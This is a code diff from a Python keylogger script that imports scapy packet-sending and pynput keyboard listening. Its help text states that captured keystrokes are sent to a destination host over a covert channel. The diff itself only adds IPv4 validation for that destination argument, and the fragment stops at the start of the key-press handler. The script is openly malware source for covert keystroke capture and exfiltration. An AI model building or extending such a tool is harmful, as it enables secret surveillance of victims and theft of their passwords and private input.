@@ -3,11 +3,29 @@ from scapy.all import TCP, IP, send
 from sys import exit
 from pynput.keyboard import Key, Listener
 import argparse
+from ipaddress import ip_address, IPv4Address, IPv6Address
 
 # Command Line Arguments
 parser = argparse.ArgumentParser("./keylogger.py")
 parser.add_argument("destination_host", help="The IPv4 address or hostname of the destination machine. All keylog events will be sent to this host over a covert channel.")
 args = parser.parse_args()
+
+def isValidIPv4(address: str) -> (bool, str):
+    try:
+        ip = ip_address(address)
+        if isinstance(ip, IPv6Address):
+            return False, "IPv6 Addresses are not allowed. Only IPv4 addresses will work."
+        return True, f"Valid IPv4 Address: {address}"
+    except:
+        return False, f"Invalid IPv4 Address: {address}"
+
+# Verify arguments
+success, reason = isValidIPv4(args.destination_host)
+if not success:
+    print(f"Error: {reason}")
+    exit(1)
+else:
+    print(f"{reason}")
 
 def on_press(key):
     try:
